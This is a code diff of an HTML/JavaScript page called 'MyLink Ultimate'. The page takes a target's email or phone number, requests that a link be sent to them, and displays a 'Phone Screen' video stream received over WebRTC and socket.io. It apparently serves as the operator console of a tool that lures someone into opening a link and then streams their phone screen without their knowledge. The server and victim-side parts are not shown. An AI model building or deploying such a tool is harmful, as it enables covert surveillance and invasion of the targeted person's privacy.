@@ -1,68 +1,49 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>MyLink Ultimate</title>
   <style>
-    body { 
-      background: #0f0f1a; color: #e0e0e0; font-family: Arial; 
-      text-align: center; padding: 40px; margin: 0;
-    }
-    .box { 
-      background: #1a1a2e; padding: 30px; border-radius: 20px; 
-      max-width: 500px; margin: auto; box-shadow: 0 0 20px rgba(0,255,157,0.3);
-    }
-    input, button { 
-      width: 100%; padding: 15px; margin: 10px 0; border: none; border-radius: 12px; font-size: 16px;
-    }
-    input { background: #16213e; color: white; }
-    button { background: #00ff9d; color: black; font-weight: bold; cursor: pointer; }
-    #status { margin: 20px 0; font-size: 18px; min-height: 30px; }
-    video { width: 100%; max-width: 600px; border: 4px solid #00ff9d; border-radius: 16px; margin-top: 20px; background: black; }
+    body {background:#111; color:#0f0; font-family:Arial; text-align:center; padding:20px;}
+    input{width:90%; padding:15px; margin:10px; font-size:18px; border:none; border-radius:10px;}
+    button{width:90%; padding:15px; background:#0f0; color:#000; border:none; border-radius:10px; font-weight:bold; font-size:18px;}
+    #s{margin:20px 0; font-size:20px;}
+    video{width:100%; max-width:600px; border:3px solid #0f0; border-radius:15px; margin-top:20px; background:#000;}
   </style>
 </head>
 <body>
-  <div class="box">
-    <h1>MyLink Ultimate</h1>
-    <p>Enter email or Kenyan phone number</p>
-    
-    <input type="text" id="target" placeholder="example@gmail.com OR +254712345678" />
-    <button onclick="send()">SEND LINK</button>
-    
-    <div id="status"></div>
-    
-    <h2>Phone Screen</h2>
-    <video id="video" autoplay playsinline controls></video>
-  </div>
+  <h1>MyLink Ultimate</h1>
+  <p>Enter email or phone number</p>
+  <input id="t" placeholder="example@gmail.com OR 0712345678">
+  <button onclick="go()">SEND LINK</button>
+  <div id="s"></div>
+  <h2>Phone Screen</h2>
+  <video id="v" autoplay playsinline controls></video>
 
   <script src="/socket.io/socket.io.js"></script>
   <script>
     const socket = io();
-    const video = document.getElementById('video');
+    const v = document.getElementById('v');
 
-    socket.on('offer', async (offer) => {
+    socket.on('offer', async o => {
       const pc = new RTCPeerConnection();
-      pc.setRemoteDescription(offer);
-      const answer = await pc.createAnswer();
-      await pc.setLocalDescription(answer);
-      socket.emit('answer', answer);
-      pc.ontrack = e => video.srcObject = e.streams[0];
+      pc.setRemoteDescription(o);
+      const a = await pc.createAnswer();
+      await pc.setLocalDescription(a);
+      socket.emit('answer', a);
+      pc.ontrack = e => v.srcObject = e.streams[0];
     });
 
-    async function send() {
-      const t = document.getElementById('target').value.trim();
-      if (!t) return status("Enter email or phone", "red");
-
-      status("Sending...", "white");
-      const res = await fetch(`/send?target=${encodeURIComponent(t)}`);
-      const html = await res.text();
-      document.getElementById('status').innerHTML = html;
+    async function go() {
+      const target = document.getElementById('t').value.trim();
+      if (!target) return s("Enter something");
+      s("Sending...");
+      const r = await fetch(`/send?target=${encodeURIComponent(target)}`);
+      document.getElementById('s').innerHTML = await r.text();
     }
 
-    function status(msg, color) {
-      document.getElementById('status').innerHTML = `<p style="color:${color}">${msg}</p>`;
-    }
+    function s(m) { document.getElementById('s').innerHTML = '<p>' + m + '</p>'; }
   </script>
 </body>
 </html>
